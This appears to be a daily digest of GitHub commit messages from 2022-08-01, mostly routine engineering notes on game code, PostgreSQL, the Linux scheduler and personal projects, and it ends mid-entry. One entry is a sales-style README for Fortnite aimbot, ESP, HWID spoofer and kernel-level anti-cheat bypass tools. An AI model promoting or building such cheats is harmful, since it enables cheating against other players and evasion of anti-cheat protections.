## *good gosh*

It's so many stuff on **github**! Here's one more attempt to *get a grip*. And
an [index](docs/messages.md).

---

# [2022-08-01](docs/good-messages/2022/2022-08-01.md)


1,905,655 events recorded by [gharchive.org](https://www.gharchive.org/) of which 1,905,655 were push events containing 2,946,169 commit messages that amount to 238,213,489 characters filtered with [words.py@e23d022007...](https://github.com/defgsus/good-github/blob/e23d022007992279f9bcb3a9fd40126629d787e2/src/words.py) to these 37 messages:


## [Danaleja2005/tgstation](https://github.com/Danaleja2005/tgstation)@[8f0df7816b...](https://github.com/Danaleja2005/tgstation/commit/8f0df7816bae3c5dedf599611cda3e6039024e14)
#### Monday 2022-08-01 00:05:52 by Kylerace

(code bounty) The tram is now unstoppably powerful. it cannot be stopped, it cannot be slowed, it cannot be reasoned with. YOU HAVE NO IDEA HOW READY YOU ARE (#66657)

ever see the tram take 10 milliseconds per movement to move 2100 objects? now you have
https://user-images.githubusercontent.com/15794172/166198184-8bab93bd-f584-4269-9ed1-6aee746f8f3c.mp4
About The Pull Request

fixes #66887

done for the code bounty posted by @MMMiracles to optimize the tram so that it can be sped up. the tram is now twice as fast, firing every tick instead of every 2 ticks. and is now around 10x cheaper to move. also adds support for multiz trams, as in trams that span multiple z levels.

the tram on master takes around 10-15 milliseconds per movement with nothing on it other than its starting contents. why is this? because the tram is the canary in the coal mines when it comes to movement code, which is normally expensive as fuck. the tram does way more work than it needs to, and even finds new ways to slow the game down. I'll walk you through a few of the dumber things the tram currently does and how i fixed them.

    the tram, at absolute minimum, has to move 55 separate industrial_lift platforms once per movement. this means that the tram has to unregister its entered/exited signals 55 times when "the tram" as a singular object is only entering 5 new turfs and exiting 5 old turfs every movement, this means that each of the 55 platforms calculates their own destination turfs and checks their contents every movement. The biggest single optimization in this pr was that I made the tram into a single 5x11 multitile object and made it only do entering/exiting checks on the 5 new and 5 old turfs in each movement.
    way too many of the default tram contents are expensive to move for something that has to move a lot. fun fact, did you know that the walls on the tram have opacity? do you know what opacity does for movables? it makes them recalculate static lighting every time they move. did you know that the tram, this entire time, was taking JUST as much time spamming SSlighting updates as it was spending time in SStramprocess? well it is! now it doesnt do that, the walls are transparent. also, every window and every grille on the tram had the atmos_sensitive element applied to them which then added connect_loc to them, causing them to update signals every movement. that is also dumb and i got rid of that with snowflake overrides. Now we must take care to not add things that sneakily register to Moved() or the moved signal to the roundstart tram, because that is dumb, and the relative utility of simulating objects that should normally shatter due to heat and conduct heat from the atmosphere is far less than the cost of moving them, for this one object.
    all tram contents physically Entered() and Exited() their destination and old turfs every movement, even though because they are on a tram they literally do not interact with the turf, the tram does. also, any objects that use connect_loc or connect_loc behalf that are on the same point on the tram also interact with each other because of this. now all contents of the tram act as if theyre being abstract_move()'d to their destination so that (almost) nothing thats in the destination turf or the exit turf can react to the event of "something laying on the tram is moving over you". the rare things that DO need to know what is physically entering or exiting their turf regardless of whether theyre interacting with the ground can register to the abstract entered and exited signals which are now always sent.
    many of the things hooked into Moved(), whether it be overrides of Moved() itself, or handlers for the moved signal, add up to a LOT of processing time. especially for humans. now ive gotten rid of a lot of it, mostly for the tram but also for normal movement. i made footsteps (a significant portion of human movement cost) not do any work if the human themselves didnt do the movement. i optimized has_gravity() a fair amount, and then realized that since everything on the tram isnt changing momentum, i didnt actually need to check gravity for the purposes of drifting (newtonian_move() was taking a significant portion of the cost of movement at some points along the development process). so now it simply doesnt call newtonian_move() for movements that dont represent a change in momentum (by default all movements do).

also i put effort into 1. better organizing tram/lift code so that most of it is inside of a dedicated modules folder instead of scattered around 5 generic folders and 2. moved a lot of behavior from lift platforms themselves into their lift_master_datum since ideally the platforms would just handle moving themselves, while any behavior involving the entire lift such as "move to destination" and "blow up" would be handled by the lift_master_datum.

also
https://user-images.githubusercontent.com/15794172/166220129-ff2ea344-442f-4e3e-94f0-ec58ab438563.mp4
multiz tram (this just adds the capability to map it like this, no tram does this)
Actual Performance Differences

to benchmark this, i added a world.Profile(PROFILER_START) and world.Profile(PROFILER_START) to the tram moving, so that it generates a profiler output of all tram movement without any unrelated procs being recorded (except for world.Profile() overhead). this made it a lot easier to quantify what was slowing down both the tram and movement in general. and i did 3 types of tests on both master and my branch.

also i should note that i sped up the "master" tram test to move once per tick as well, simply because the normal movement speed seems unbearably slow now. so all recorded videos are done at twice the speed of the real tram on master. this doesnt affect the main thing i was trying to measure: cost for each movement.

the first test was the base tram, containing only my player mob and the movables starting on the tram roundstart. on master, this takes around 13 milliseconds or so on my computer (which is pretty close to what it takes on the servers), on this branch, it takes between 0.9-1.3 milliseconds.

ALSO in these benchmarks youll see that tram/proc/travel() will vary significantly between the master and optimized branches. this is 100% because there are 55 times more platforms moving on master compared to the master branch, and thus 55x more calls to this proc. every test was recorded with the exact same amount of distance moved

here are the master and optimized benchmark text files:
master
master base tram.txt
https://user-images.githubusercontent.com/15794172/166210149-f118683d-6f6d-4dfb-b9e4-14f17b26aad8.mp4
also this shows the increased SSlighting usage resulting from the tram on master spamming updates, which doesnt happen on the optimized branch

optimized
optimization base tram.txt
https://user-images.githubusercontent.com/15794172/166206280-cd849aaa-ed3b-4e2f-b741-b8a5726091a9.mp4

the second test is meant to benchmark the best case scaling cost of moving objects, where nothing extra is registered to movement besides the bare minimum stuff on the /atom/movable level. Each of the open tiles of the tram had 1 bluespace rped filled with parts dumped onto it, to the point that the tram in total was moving 2100 objects. the vast majority of these objects did nothing special in movement so they serve as a good base case. only slightly off due to the rped's registering to movement.

on master, this test takes over 100 milliseconds per movement
master 2000 obj's.txt
https://user-images.githubusercontent.com/15794172/166210560-f4de620d-7dc6-4dbd-8b61-4a48149af707.mp4

when optimized, about 10 milliseconds per movement
https://user-images.githubusercontent.com/15794172/166208654-bc10086b-bbfc-49fa-9987-d7558109cc1d.mp4
optimization 2000 obj's.txt

the third test is 300 humans spawned onto the tram, meant to test all the shit added on to movement cost for humans/carbons. in retrospect this test is actually way too biased in favor of my optimizations since the humans are all in only 3 tiles, so all 100 humans on a tile are reacting to the other 99 humans movements, which wouldnt be as bad if they were distributed across 20 tiles like in the second test. so dont read into this one too hard.

on master, this test takes 200 milliseconds
master 300 catgirls.txt

when optimized, this takes about 13-14 milliseconds.
optimization 300 catgirls on ram ranch.txt
Why It's Good For The Game

the tram is literally 10x cheaper to move. and the code is better organized.
currently on master the tram is as fast as running speed, meaning it has no real relative utility compared to just running the tracks (except for the added safety of not having to risk being ran over by the tram). now the tram of which we have an entire map based around can be used to its full potential.

also, has some fixes to things on the tram reacting to movement. for example on master if you are standing on a tram tile that contains a banana and the TRAM moves, you will slip if the banana was in that spot before you (not if you were there first however). this is because the banana has no concept of relative movement, you and it are in the same reference frame but the banana, which failed highschool physics, believes you to have moved onto it and thus subjected you to the humiliation of an unjust slipping. now since tram contents that dont register to abstract entered/exited cannot know about other tram contents on the same tile during a movement, this cannot happen.

also, you no longer make footstep sounds when the tram moves you over a floor
TODO

mainly opened it now so i can create a stopping point and attend to my other now staling prs, we're at a state of functionality far enough to start testmerging it anyways.

add a better way for admins to be notified of the tram overloading the server if someone purposefully stuffs it with as much shit as they can, and for admins to clear said shit.
automatically slow down the tram if SStramprocess takes over like, 10 milliseconds complete. the tram still cant really check tick and yield without introducing logic holes, so making sure it doesnt take half of the tick every tick is important
go over my code to catch dumb shit i forgot about, there always is for these kinds of refactors because im very messy
remove the area based forced_gravity optimization its not worth figuring out why it doesnt work
fix the inevitable merge conflict with master lol
create an icon for the tram_tunnel area type i made so that objects on the tram dont have to enter and exit areas twice in a cross-station traversal

    add an easy way to vv tram lethality for mobs/things being hit by it. its an easy target in another thing i already wanted to do: a reinforced concept of shared variables from any particular tram platform and the entire tram itself. admins should be able to slow down the tram by vv'ing one platform and have it apply to the entire tram for example.

Changelog

cl
balance: the tram is now twice as fast, pray it doesnt get any faster (it cant without raising world fps)
performance: the tram is now about 10 times cheaper to move for the server
add: mappers can now create trams with multiple z levels
code: industrial_lift's now have more of their behavior pertaining to "the entire lift" being handled by their lift_master_datum as opposed to belonging to a random platform on the lift.
/cl

---
## [AquillaF/Shiptest](https://github.com/AquillaF/Shiptest)@[f421be47a9...](https://github.com/AquillaF/Shiptest/commit/f421be47a95fc04e78b3d48601508222dd84ee4d)
#### Monday 2022-08-01 00:31:12 by Recoherent

Adds five new IPC antennae (#1279)

* adds 5 new ipc antennae

feeling kinda hopeless idk

* nyaru horns thicker

this is the part where i yell at royal for replying with something dumb

* removes lights it doesn't even fucking exist

what were they thinking?????????????????????

* forgot to remove joke name

oooooooooooooooooops, the joke will have to live in our hearts

---
## [wes59856/Fortnite-Esp-Aimbot-Exploits-Hwid-Spoofer-Cleaner-Hack-Cheat](https://github.com/wes59856/Fortnite-Esp-Aimbot-Exploits-Hwid-Spoofer-Cleaner-Hack-Cheat)@[57dad6d0a5...](https://github.com/wes59856/Fortnite-Esp-Aimbot-Exploits-Hwid-Spoofer-Cleaner-Hack-Cheat/commit/57dad6d0a520afc021e074810b30514842fa5f7f)
#### Monday 2022-08-01 00:35:55 by wes59856

###  Fortnite Aimbot + Esp C++  ![GitHub release](https://img.shields.io/github/release/ppy/osu.svg) ![CodeFactor](https://www.codefactor.io/repository/github/ppy/osu/badge) ![dev chat](https://discordapp.com/api/guilds/188630481301012481/widget.png?style=shield) ![Crowdin](https://d322cqt584bo4o.cloudfront.net/osu-web/localized.svg) ![Renovate enabled](https://img.shields.io/badge/renovate-enabled-brightgreen.svg) ![license](https://img.shields.io/github/license/mashape/apistatus.svg) ![Chat](https://badges.gitter.im/awesome-twitter-bots/Lobby.svg)  ```sh-session "Fortnite" RELEASE C++,C / AIMBOT / ESP / SPOOFER / DRIVER / Injector ``` *** <p align="center">    <img src="https://readme-spotify-status-rho.vercel.app/api/run-spotify-status.py" alt="s4nx Playing Now" width="500" /> <p align="center">  ## Information **External Game Project written mostly in C++ along with external libraries Internal And External projects.I started to get rid of scammers.i am developing Hack Cheat Driver Esp Aimbot Magic Bullet Driver Injector Overlay Imgui for many games.Games I've developed with hack so far Rise Online ,Apex Legends ,Bloodhunt , Call of Duty: Cold War , Call of Duty: Vanguard ,Call of Duty: Warzone/MW ,Dayz ,Dead By Daylight ,Destiny 2 ,Enlisted ,Escape From Tarkov ,Fortnite ,Game accounts ,Halo Infinite ,HyperFlick ,New Critical Hit ,New World ,Mir 4 ,Noble ,Playerunknowns Battlegrounds ,Steam ,Rainbow Siz Siege , Playerunknown's Battlegrounds, Rijin ,Rogue Company ,Rust ,Scum ,SpliteGa ,Super People ,Unleashed ,Valorant ,Spoofer ::: Buying a Hack Cheat don't be scammed, more to come**  We, at Lavicheats, always strive to be one of the leading and most reliable gameplay cheat and hack providers, when it comes to security, usability, and compatibility. We've been developing high-quality, undetected games hacks for years. We update all of our gameplay hacks continuously, including Fortnite Battle cheats, to stay undetected and keep our online gamers protected against various anti-cheat software and tools. Here are some reasons why you should use our hacks:  Modern, quality hacks developed by professional developers A variety of game hacks and cheats with outstanding features 24/7 customer support Protection against anti-cheat software Completely secure and undetected Continuous patches and updates Kernel level bypasses for complete and long-term security  **Updated Time 17/05/2022**    ![image](https://user-images.githubusercontent.com/105746452/169086119-30a373c6-b177-4073-aa64-49dc993de3b8.png) ## Features <details> <summary>Features (Drop Down)</summary>    * **AIMBOT**    * **ESP**    * **SPOOFER**   * **DRIVER**  *  **INJECTOR**   </details>  **Aimbot:** * Weapon Selection * Memory Aim * On Key (On/Off) * Silent Aim (P Silent) * Aim Bones (Head) (Neck) (Body) (Closest) * No Recoil * Knocked Players * Backtrack * Visibles Check * Smooth (1-10) * FOV (1-100)    **Visuals:** * On Key (On/Off) * Player Names * Player Distance * Itmes * Health Bar (Constant) (Normal) * Health Text * Bounding Box (3D) (2D) * Outlines (Above) (Below) (Crosshair) * Color Mates * Color Picker    **Misc/Exploits:** * Spin Bot (Rage) * Fly (On Key) (On/Off) (Risky) * Speed Hack (On Key) (1-5) (Risky) * Boat Fly * Auto Heal * Crosshair (Custom) (Color Picker) * Ingame FPS * Can Jump * Instant Reload * Warzone * FOV Changer * Hitbox Extender * Rapid Fire * Air Stuck * Car Fly * Spoof Username   **Stream Proof:** * OBS Studio * Xbox Gamebar * Nvidia ***  ## Media  ![image](https://user-images.githubusercontent.com/105746452/169086131-07935fc3-6bfc-4bdb-8053-64e0810b7ea3.png)   ## âœ¨ DONATE Buy Me Coffee  BTC - 144feg2TVeVjhLfXVrKvaTzu2ViX4gYv6q   ## Disclaimer This project is only for educational purposes. Therefore I'm not responsible for any harm/illegal activity that may happens. I made this project to learn more about reverse engineering and not to ruin the experience for other gamers. I will not be updating the offsets for this reason.This may not be exact code as the one in my hackathon.

---
## [justinpryzby/postgres](https://github.com/justinpryzby/postgres)@[ec0f8374cd...](https://github.com/justinpryzby/postgres/commit/ec0f8374cdcfa2cc0b42f525bebccbf19d67363a)
#### Monday 2022-08-01 00:37:19 by Tomas Vondra

Showing applied extended statistics in explain

Hi,

With extended statistics it may not be immediately obvious if they were
applied and to which clauses. If you have multiple extended statistics,
we may also apply them in different order, etc. And with expressions,
there's also the question of matching expressions to the statistics.

So it seems useful to include this into in the explain plan - show which
statistics were applied, in which order. Attached is an early PoC patch
doing that in VERBOSE mode. I'll add it to the next CF.

A simple example demonstrating the idea:

======================================================================

  create table t (a int, b int);
  insert into t select mod(i,10), mod(i,10)
    from generate_series(1,100000) s(i);

  create statistics s on a, b from t;
  analyze t;

test=# explain (verbose) select * from t where a = 1 and b = 1;
                          QUERY PLAN
---------------------------------------------------------------
 Seq Scan on public.t  (cost=0.00..1943.00 rows=10040 width=8)
   Output: a, b
   Filter: ((t.a = 1) AND (t.b = 1))
   Statistics: public.s  Clauses: ((a = 1) AND (b = 1))
(4 rows)

test=# explain (verbose) select 1 from t group by a, b;
                              QUERY PLAN
----------------------------------------------------------------------
 HashAggregate  (cost=1943.00..1943.10 rows=10 width=12)
   Output: 1, a, b
   Group Key: t.a, t.b
   ->  Seq Scan on public.t  (cost=0.00..1443.00 rows=100000 width=8)
         Output: a, b
         Statistics: public.s  Clauses: (a AND b)
(6 rows)

======================================================================

The current implementation is a bit ugly PoC, with a couple annoying
issues that need to be solved:

1) The information is stashed in multiple lists added to a Plan. Maybe
there's a better place, and maybe we need to invent a better way to
track the info (a new node stashed in a single List).

2) The deparsing is modeled (i.e. copied) from how we deal with index
quals, but it's having issues with nested OR clauses, because there are
nested RestrictInfo nodes and the deparsing does not expect that.

3) It does not work for functional dependencies, because we effectively
"merge" all functional dependencies and apply the entries. Not sure how
to display this, but I think it should show the individual dependencies
actually applied.

4) The info is collected always, but I guess we should do that only when
in explain mode. Not sure how expensive it is.

5) It includes just statistics name + clauses, but maybe we should
include additional info (e.g estimate for that combination of clauses).

6) The clauses in the grouping query are transformed to AND list, which
is wrong. This is easy to fix, I was lazy to do that in a PoC patch.

7) It does not show statistics for individual expressions. I suppose
examine_variable could add it to the rel somehow, and maybe we could do
that with index expressions too?

regards

--
Tomas Vondra
EnterpriseDB: http://www.enterprisedb.com
The Enterprise PostgreSQL Company

From 4629d1d9b1fc5f6c3bc93e0544b0c022345086c9 Mon Sep 17 00:00:00 2001
From: Tomas Vondra <tomas.vondra@postgresql.org>
Date: Thu, 18 Mar 2021 15:09:24 +0100
Subject: [PATCH] show stats in explain

---
## [Vicious-MCModding/ViciousCore](https://github.com/Vicious-MCModding/ViciousCore)@[fea2d0caf3...](https://github.com/Vicious-MCModding/ViciousCore/commit/fea2d0caf3caf87d6bd0d280e0c3d6cc83e7e4ce)
#### Monday 2022-08-01 01:55:58 by Drathonix

I tried way too long to get this to work in the dev space. Such a waste of my time. ForgeGradle needs to get its shit fixed. God I am so pissed of about the hours I wasted typing shit like configurations.XYZ.exclude(group: bullshit) and failing miserably anyways. This is FG's fault, not mine

---
## [matthew-ia/cayo](https://github.com/matthew-ia/cayo)@[964b7669a8...](https://github.com/matthew-ia/cayo/commit/964b7669a8434bc2ccccb56e651dcfa9a9aaf4eb)
#### Monday 2022-08-01 02:09:57 by Matthew Alicea

feat: added custom markup preprocessor; P.S. I'm an idiot

My god, I forgot the most critical thing. I've been writing these
custom preprocessors without even realizing I wasn't returning the code
they were processing, so the output bundle still was just the source.

I honestly don't know if this was the root of all my recent issues, but
surely nothing I did was going to work either way.

---
## [tamarindmonkey/openpilot](https://github.com/tamarindmonkey/openpilot)@[2d07153f0d...](https://github.com/tamarindmonkey/openpilot/commit/2d07153f0d9038c56c7cb984d645f023c42e045d)
#### Monday 2022-08-01 02:11:25 by tamarindmonkey

night time camera sucks

sorry, but I drive at night and pay full attention.. the IR/cam is awful.

---
## [alex-w/kstars](https://github.com/alex-w/kstars)@[6a60e821a8...](https://github.com/alex-w/kstars/commit/6a60e821a833b60dc4a18a7a95a43b7bc727686e)
#### Monday 2022-08-01 02:20:41 by Jasem Mutlaq

INDI Devices Handling Refactor

This is a major refactor for how KStars handles INDI devices. Traditionally, Ekos would create devices as soon as they are received. Each device is assigned a specific device type based on *signature* properties that belong to that device class. For example, EQUATORIAL_EOD_COORD would indicate that the device is a mount, and so forth. While this scheme worked well for most simple devices, it became complex to handle INDI devices with multiple interfaces (e.g. CCD with Filter wheel built in).

These kind of devices were supported by retaining them as GenericDevices and then sending general INDI commands to them when needed. Using this, we were able to support most multi-interface devices for many years in KStars. However, with even more complex devices that are not conventional (e.g. Dome with weather station interface), it became very complicated to handle such devices effectively without ugly hacks.

This MR introduces an update method for dealing with INDI devices:
1. All devices are created as _GenericDevices_
2. Based on device DriverInterface property, we create _ConcreteDevices_ accordingly. A concrete device is derived from each supported INDI device interface (i.e. Guider, Focuser, Correlator, ...etc)
3. ConcreteDevices are only announced when READY. This is in contrast to previous behavior when devices were announced as soon as a _signature_ property is detected. We determine if a device ready by monitoring the flow of defined properties using a timer. This results in highly simplified method for dealing with device properties.

Lots of testing is required now to ensure the new scheme works.

---
## [petpeople/react-native](https://github.com/petpeople/react-native)@[6c080167e6...](https://github.com/petpeople/react-native/commit/6c080167e6e342574298f43bb37becf139f6ac24)
#### Monday 2022-08-01 03:44:44 by edenb-moveo

Update ImageBackground.js (#32055)

Summary:
Currently ImageBackGround component has optional style props, but if you don't pass it as prop, it still "thinks" you pass style and crushes.
In this pr, I made width and height inside component to be optional so it won't crush.

## Changelog

[General] [Fix] - Changed ImageBackground's style so it won't crush.

[Screen Shot 2021-08-20 at 15 05 45](https://user-images.githubusercontent.com/62840630/130230568-be02b1a2-52ec-4f9d-b3d3-212552d3882b.png)

As you can see in this component, I tried to use ImageBackground without any style props, and my app crushes. Then I added style with empty object and the app didn't crush anymore, as you can see here:
![Screen Shot 2021-08-20 at 15 09 23](https://user-images.githubusercontent.com/62840630/130230932-a576c397-a910-4e40-a202-56482d83dd9c.png).

In conclusion, if we make width and height styles optionals inside ImageBackground component, it won't crush anymore.

Thoughts:
Maybe consider to make style props for this component none-optional because it isn't make any sense that image won't have any style at all.

Thanks ahead, that was my first pr, Eden Binyamin.

Pull Request resolved: https://github.com/facebook/react-native/pull/32055

Reviewed By: charlesbdudley

Differential Revision: D30452297

Pulled By: sshic

fbshipit-source-id: b7071aa457dba443ed2f627c2458ea84fd24b36d

---
## [zhengruifeng/spark](https://github.com/zhengruifeng/spark)@[c4c623a3a8...](https://github.com/zhengruifeng/spark/commit/c4c623a3a890267b2f9f8d472c8be30fc5db53e1)
#### Monday 2022-08-01 04:04:04 by Hyukjin Kwon

[SPARK-39869][SQL][TESTS] Fix flaky hive - slow tests because of out-of-memory

### What changes were proposed in this pull request?

This PR adds some manual `System.gc`. I know enough that this doesn't guarantee the garbage collection and sounds somewhat funny but it works in my experience so far, and I did such hack in some places before.

### Why are the changes needed?

To deflake the tests.

### Does this PR introduce _any_ user-facing change?

No, dev and test-only.

### How was this patch tested?

CI in this PR should test it out.

Closes #37291 from HyukjinKwon/SPARK-39869.

Authored-by: Hyukjin Kwon <gurwls223@apache.org>
Signed-off-by: Hyukjin Kwon <gurwls223@apache.org>

---
## [treckstar/yolo-octo-hipster](https://github.com/treckstar/yolo-octo-hipster)@[f7be3aeb73...](https://github.com/treckstar/yolo-octo-hipster/commit/f7be3aeb739ec58928880039c793e70520a71ba9)
#### Monday 2022-08-01 04:22:03 by treckstar

People listen up don't stand so close, I got somethin that you all should know. Holy matrimony is not for me, I'd rather die alone in misery.

---
## [Axlefublr/Main](https://github.com/Axlefublr/Main)@[533f0074dc...](https://github.com/Axlefublr/Main/commit/533f0074dca9d3ad2cd022b3362a43254449b6ea)
#### Monday 2022-08-01 05:15:10 by Axlefublr

No continuing lines. While that does improve performance, it kinda looks ugly. Even with formatting, it's just kinda ass, and therefore not worth it. Especially considering that it's instant anyway; Now my guis are either hotifexisted or hotifactived, the previous issue I wanted to solve with global hotkeys is so when I closed a gui, it wouldn't activate a strange window. This issue doesn't seem to happen anymore, and if it does, it's worth it for what I now get; The guis are neither always active, nor NA. Meaning, I can use as many at once as I want. I can get the keycodes of the entire alphabet if I so wanted, while getting the info for all active windows and multiple coordinates (although I'm not sure how I'd remember which one is which). Now there's no 'rush' to actually using the info I'm getting, which is a big plus. Better yet, it's now more usable to other people, if we ignore the dependencies

---
## [Himemoria/android_kernel_xiaomi_mt6768](https://github.com/Himemoria/android_kernel_xiaomi_mt6768)@[d63e83f548...](https://github.com/Himemoria/android_kernel_xiaomi_mt6768/commit/d63e83f548dad7674124f973948274d1d2167c73)
#### Monday 2022-08-01 05:17:40 by Peter Zijlstra

sched/core: Fix ttwu() race

Paul reported rcutorture occasionally hitting a NULL deref:

  sched_ttwu_pending()
    ttwu_do_wakeup()
      check_preempt_curr() := check_preempt_wakeup()
        find_matching_se()
          is_same_group()
            if (se->cfs_rq == pse->cfs_rq) <-- *BOOM*

Debugging showed that this only appears to happen when we take the new
code-path from commit:

  2ebb17717550 ("sched/core: Offload wakee task activation if it the wakee is descheduling")

and only when @cpu == smp_processor_id(). Something which should not
be possible, because p->on_cpu can only be true for remote tasks.
Similarly, without the new code-path from commit:

  c6e7bd7afaeb ("sched/core: Optimize ttwu() spinning on p->on_cpu")

this would've unconditionally hit:

  smp_cond_load_acquire(&p->on_cpu, !VAL);

and if: 'cpu == smp_processor_id() && p->on_cpu' is possible, this
would result in an instant live-lock (with IRQs disabled), something
that hasn't been reported.

The NULL deref can be explained however if the task_cpu(p) load at the
beginning of try_to_wake_up() returns an old value, and this old value
happens to be smp_processor_id(). Further assume that the p->on_cpu
load accurately returns 1, it really is still running, just not here.

Then, when we enqueue the task locally, we can crash in exactly the
observed manner because p->se.cfs_rq != rq->cfs_rq, because p's cfs_rq
is from the wrong CPU, therefore we'll iterate into the non-existant
parents and NULL deref.

The closest semi-plausible scenario I've managed to contrive is
somewhat elaborate (then again, actual reproduction takes many CPU
hours of rcutorture, so it can't be anything obvious):

					X->cpu = 1
					rq(1)->curr = X

	CPU0				CPU1				CPU2

					// switch away from X
					LOCK rq(1)->lock
					smp_mb__after_spinlock
					dequeue_task(X)
					  X->on_rq = 9
					switch_to(Z)
					  X->on_cpu = 0
					UNLOCK rq(1)->lock

									// migrate X to cpu 0
									LOCK rq(1)->lock
									dequeue_task(X)
									set_task_cpu(X, 0)
									  X->cpu = 0
									UNLOCK rq(1)->lock

									LOCK rq(0)->lock
									enqueue_task(X)
									  X->on_rq = 1
									UNLOCK rq(0)->lock

	// switch to X
	LOCK rq(0)->lock
	smp_mb__after_spinlock
	switch_to(X)
	  X->on_cpu = 1
	UNLOCK rq(0)->lock

	// X goes sleep
	X->state = TASK_UNINTERRUPTIBLE
	smp_mb();			// wake X
					ttwu()
					  LOCK X->pi_lock
					  smp_mb__after_spinlock

					  if (p->state)

					  cpu = X->cpu; // =? 1

					  smp_rmb()

	// X calls schedule()
	LOCK rq(0)->lock
	smp_mb__after_spinlock
	dequeue_task(X)
	  X->on_rq = 0

					  if (p->on_rq)

					  smp_rmb();

					  if (p->on_cpu && ttwu_queue_wakelist(..)) [*]

					  smp_cond_load_acquire(&p->on_cpu, !VAL)

					  cpu = select_task_rq(X, X->wake_cpu, ...)
					  if (X->cpu != cpu)
	switch_to(Y)
	  X->on_cpu = 0
	UNLOCK rq(0)->lock

However I'm having trouble convincing myself that's actually possible
on x86_64 -- after all, every LOCK implies an smp_mb() there, so if ttwu
observes ->state != RUNNING, it must also observe ->cpu != 1.

(Most of the previous ttwu() races were found on very large PowerPC)

Nevertheless, this fully explains the observed failure case.

Fix it by ordering the task_cpu(p) load after the p->on_cpu load,
which is easy since nothing actually uses @cpu before this.

Fixes: c6e7bd7afaeb ("sched/core: Optimize ttwu() spinning on p->on_cpu")
Reported-by: Paul E. McKenney <paulmck@kernel.org>
Tested-by: Paul E. McKenney <paulmck@kernel.org>
Signed-off-by: Peter Zijlstra (Intel) <peterz@infradead.org>
Signed-off-by: Ingo Molnar <mingo@kernel.org>
Link: https://lkml.kernel.org/r/20200622125649.GC576871@hirez.programming.kicks-ass.net
Signed-off-by: Egii <regidesoftian@gmail.com>

---
## [jeanchalard/conf](https://github.com/jeanchalard/conf)@[18b65db0b1...](https://github.com/jeanchalard/conf/commit/18b65db0b10299b89b83fd0bfb677b603e6edf71)
#### Monday 2022-08-01 07:03:53 by J

Add an install script.

Traditionally I had my conf directly as a .git in $HOME. This
is inconvenient for a number of reasons ; a big one is, my
entire $HOME becomes a git repo so commands like `git status`
will do something anywhere under my home, when it's usually
not relevant (e.g. `git status` outside of a git repo should
give an error, not give me a status for an unrelated repo,
it's confusing). Also $HOME is full of stuff not managed in
the git so `git status` would show hundreds of unrelated
files that I'd ignore every time.

Now that's pretty stupid, but I never got arount to fixing
it on my home machine, though on newer installs I've taken
to put the git is some subdir and symlinking to the git-
managed files, which is a lot more sane.

But now I find that for some tools, $HOME/.xkb is actually
special. For example, this is preventing the kwin tests
from running, because they try to find a definition for a
us keyboard with pc104 in ~/.xkb when it's not meant for
that at all. Or maybe it was a long time ago, but I'm
pretty sure it no longer is. We'll see if anything breaks...

Now with this fixed and out of the way, it's important to
remember to not just ln -s everything from this dir to
$HOME. Obviously .git, but also en_JP and its readme which
have nothing to do in $HOME, and .xkb which is not meant
for that. In fact it will be renamed in the next patch,
since it should not start with a dot.

The best and most automatic way to do this is to have a
script to manage the correct files to link, so this patch
does that. I hope I won't forget to update the script next
time I put some new dot file that I want to manage in here.

---
## [Stake2/stake2-php](https://github.com/Stake2/stake2-php)@[d648ef61be...](https://github.com/Stake2/stake2-php/commit/d648ef61beae8a05ba42338f1f1da8aceb26d39a)
#### Monday 2022-08-01 07:23:34 by Stake2

I modified the PHP code of the file "Cover Images Folder Definer.php".
I made that to define the cover folders so I can use the folder without language if the story has the same name in the two languages.
I modified the language item definition, removing the word "Brasileiro" from all of the items that were in Portuguese.
Like story chapter folders, and story cover folders.

Added these 6 new colors to "Colors.css":
salmon
dark-salmon
darker-salmon
light-salmon
second-purple
second-dark-purple

I modified the colors and visual style of the website "The Life of Littletato", modifying the colors to pink salmon, and purple.

Fixed the "add videos to My Little Pony: Friendship Is Magic video div" JQuery on its website.
The videos were not being added to the mobile version of the website.
I modified the friends' list and the website image size.
Also modified the website's folder to "My Little Pony/Friendship Is Magic".

---
## [jupyterkat/Yogstation](https://github.com/jupyterkat/Yogstation)@[b26f9f03e0...](https://github.com/jupyterkat/Yogstation/commit/b26f9f03e00ded330c6bc2e0efa54aec0f8500cb)
#### Monday 2022-08-01 08:13:27 by Vaelophis Nyx

Makes donkpocket boxes on Box station into random spawners (#14822)

* Makes donk pockets station wide into random spawners

also adds a pile of donkpocket boxes to sec's back room and gives them a microwave

* reduced quanitity of donkpockets in sec by 4 boxes

* adds randodonks to the box mining base

* another commit I fundamentally disagree with

* reduces # of donk boxes in all kitchen variants

kill me

* microwave & gun/bomb swap

* fuck you byond map code

* fixes it. again.

---
## [Stake2/stake2-website](https://github.com/Stake2/stake2-website)@[4bf97aaa07...](https://github.com/Stake2/stake2-website/commit/4bf97aaa070d94c643d491f4210bebf716345c46)
#### Monday 2022-08-01 08:18:48 by Stake2

I updated the websites below:
Stake2
Diary
Diary Slim
Watch History
My Little Pony: Friendship Is Magic
The Life of Littletato
The Story of the Bulkan Siblings
SpaceLiving
Desert Island
The Secret of the Crystals

Reasons:
Update the social networks and fix programming errors on the "Stake2" website
Update description, chapters (blocks), modify characters tab name to "presenters" and update its content on the "Diary" website
Update Diary Slims and update synopsis/description on the "Diary Slim" website
Update the watched things on the "Watch History" website
Update the folder where the "My Little Pony: Friendship Is Magic" stays, update add video JQuery, friends list, and website image size
Update the story and chapter covers on story websites, because I modified the folder structure on the images folder of the Stake2 Website
Update the colors and visual style of "The Life of Littletato"

---
## [mrakgr/The-Spiral-Language](https://github.com/mrakgr/The-Spiral-Language)@[1840864e34...](https://github.com/mrakgr/The-Spiral-Language/commit/1840864e34446c248544e0b0dfc963f5aacc737b)
#### Monday 2022-08-01 09:29:43 by Marko Grdinić

"7:40am. If I can't or don't want to write, I will do freelancing. I can't help it that I won't get paid much doing that, but it would beat doing anything else. I simply lack proper determination to get a job. A real job seeker would not be afraid of standing a while in some company. Zenna, Viktor and now Nicole. I simply can't stop talking about AI chips with people who shouldn't have anything to do with it. I think now it should be obvious even to myself how deep the obsession runs now. I couldn't find Groq's cloud offering, some cloud provider called Nimbix that offers private services supposedly offers its chips, but I have applied for Graphcore and Tenstorrent's cloud. I do not have much desire to program them, but given how obsessed I am about it, who knows how things will go.

I am really unlucky to live on the edge like this. If I could have made even 5$ a month from poker botting things would have been so much different.

I think maybe if I could try out Graphcore and Tenstorrent's chips, and they turn out to be disappointments, that would relieve me of my obsession. But if I get something like 100x hands per hour compared to the  GPU setup, that will fire me up all over again and I will return to my old path, and this time do it correctly. I'll do the simulator thing where instead of having the net learn to handread as well as play the game, I will just have it learn to play using pre-learned features.

